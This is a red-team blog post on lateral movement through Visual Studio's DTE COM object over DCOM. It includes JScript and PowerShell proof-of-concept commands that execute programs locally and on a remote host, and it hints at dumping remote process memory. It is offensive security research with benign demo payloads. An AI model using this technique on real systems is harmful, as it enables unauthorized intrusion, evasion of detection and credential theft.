---
title: "Developers are juicy targets: DCOM & Visual Studio"
date: 2023-12-23 00:00:00 +00:00
modified: 2023-12-23 00:00:00 +00:00
tags: [red team, research, dcom, lateral movement, DTE, Visual Studio, X-C3LL]
description: Umpteenth time that you will see a lateral movement based on DCOM. This time it's Visual Studio.
image: 
---

Dear Fell**owl**ship, today's homily is about the umpteenth DCOM-based lateral movement method you'll see, this time targeting that blessing that populates any company: developers. Dreaded users whose machines are often found on quite a few exclusion lists to avoid the myriad of false positives they generate in their work.

# Prayers at the foot of the Altar a.k.a. disclaimer

*I know that DCOM is widely being used and documented and tons of method to achieve code execution are public. But is xmas eve and I wanted to publish something before the end of the year. It's a quick post, but maybe it can be helpful to someone.*

# Introduction

A few hours ago I started to dig in anti-debugging techniques that could be applied to `jscript` (indeed my original idea for my end of the year post was that after [this conversation with Rio](https://twitter.com/TheXC3LL/status/1737447578168332421)) but then I started to fall down a rabbit hole.

I was playing with [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) when I found an interesting interface called **`Debugger`**. I started to pull the thread until I reached that the COM object is from Visual Studio. Indeed it is the **"DTE"** or ["Development Tools Environment"](https://learn.microsoft.com/es-es/dotnet/api/envdte.dte?view=visualstudiosdk-2022).

To be completely honest it was the first time I heard that term, but a quick google search showed me that it is something hyper-mega-known among developers and there are huge amounts of documentation and posts about it. Shame on me.


# Local 

In the MSDN documentation we can see that there is a method called [`ExecuteCommand`](https://learn.microsoft.com/en-us/dotnet/api/envdte._dte.executecommand?view=visualstudiosdk-2019) that can be used to run a program from the command line. Let's try it:

```js
var vs = new ActiveXObject("VisualStudio.DTE");
//vs.MainWindow.Visible = true;
vs.ExecuteCommand("Tools.Shell", "calc.exe");
```

<figure>
<img src="/Visual-Studio-DCOM/calc-local.jpeg" alt="Calculator being executed"> 
<figcaption>
Calculator being executed
</figcaption>
</figure>

So far, so good.

# Remote

If you have to pwn a machine inside a big company and want to keep the alerts at minimum... what is your target? Probably people that works in IT or developers. Usually the amount of false positives from their machines makes them the perfect target to use as a jump point in an intrusion. And Visual Studio is hugely adopted in these environments.

To being able to call the COM object in the remote machine we need local administrator privileges (this is usually the minimum bar when performing lateral movements so nothing new). Just use the CLSID for **`VisualStudio.DTE`** (it varies between versions, here I am using VS 2019, if you do not know what version uses the target just bruteforce the most common versions):

```powershell
PS C:\Windows\system32> $com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("2E1517DA-87BF-4443-984A-D2BF18F5A908","192.168.56.20"))
PS C:\Windows\system32> $com.ExecuteCommand("Tools.Shell", "cmd.exe /c echo PWNED! > c:\dcom.txt")
PS C:\Windows\system32> type \\192.168.56.20\C$\dcom.txt
PWNED!
```

As I said at the beginning of the post, all started because an interface called "Debugger". And, of course, this allow you to do more stuff like for example enumerating remote processes...

<figure>
<img src="/Visual-Studio-DCOM/processes.jpeg" alt="Process List"> 
<figcaption>
List of process in the remote machine
</figcaption>
</figure>



...and more creative stuff like pausing a process (*wink wink* **;D**) attaching the debugger and then inserting a [break](https://learn.microsoft.com/en-us/dotnet/api/envdte80.debugger2.break?view=visualstudiosdk-2022#envdte80-debugger2-break(system-boolean)) or [read process memory](https://learn.microsoft.com/en-us/visualstudio/ide/reference/list-memory-command?view=vs-2022) (or if you are in YOLO mode just [MiniDump](https://learn.microsoft.com/en-us/dotnet/api/envdte80.debugger2.writeminidump?view=visualstudiosdk-2022) it).


# EoF

We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).





